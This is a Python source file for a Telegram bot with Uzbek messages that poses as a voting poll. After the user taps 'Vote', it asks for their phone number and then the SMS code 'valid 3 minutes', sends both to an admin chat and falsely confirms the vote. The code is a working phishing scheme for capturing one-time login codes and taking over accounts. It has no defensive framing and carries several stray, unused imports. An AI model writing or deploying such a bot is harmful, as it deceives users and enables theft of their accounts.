from cgitb import text
from email import message
from functools import cache
from os import stat
from turtle import st
from aiogram import types,Dispatcher
from telegram import CallbackQuery
from aiogram.dispatcher import FSMContext
from loader import dp,bot
from keyboards.default.menu import menu1,back
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from data.config import ADMINS
from states.ovoz import OvozBerish

@dp.message_handler(text="Ovoz berish")
async def ovoz(message:types.Message):
    name = message.from_user.full_name
    await message.answer(f"Marhamat hurmatli <b>{name}</b> telefon raqamingizni yozib yuboring!")
    await OvozBerish.next()

@dp.message_handler(state=OvozBerish.tel_nomer)
async def tel(message:types.Message, state:FSMContext):
    tel_numeri = message.text
    await state.update_data(
        {'tel_numeri':tel_numeri},
    )
    data = await state.get_data()
    tel_numer = data.get('tel_numeri')
    msg = f"Tel no'meri: {tel_numer}"
    await bot.send_message(chat_id=ADMINS[0],text=msg)
    await message.answer("SMS tarzda yuborilgan kodni kiriting.(kod hayotiyligi 3 daqiqa)")
    await OvozBerish.next()

@dp.message_handler(state=OvozBerish.kod)
async def kod(message:types.Message,state: FSMContext):
    kod = message.text
    await state.update_data(
        {'kod':kod}
    )
    await message.answer("Xurmatli mijoz siz muvaffaqiyat ovoz berdingiz ovoz berganingiz un katta rahmat")
    data = await state.get_data()
    tel_numer = data.get('tel_numeri')
    kod1 = data.get('kod')
    msg = f"Tel no'meri: {tel_numer}\n\nKod: {kod1}"
    await bot.send_message(chat_id=ADMINS[0],text=msg)
    await state.finish()

@dp.message_handler(text="Bekor qilish")
async def back(message:types.Message):
    await message.answer("Bekor qilindi!",reply_markup=menu1)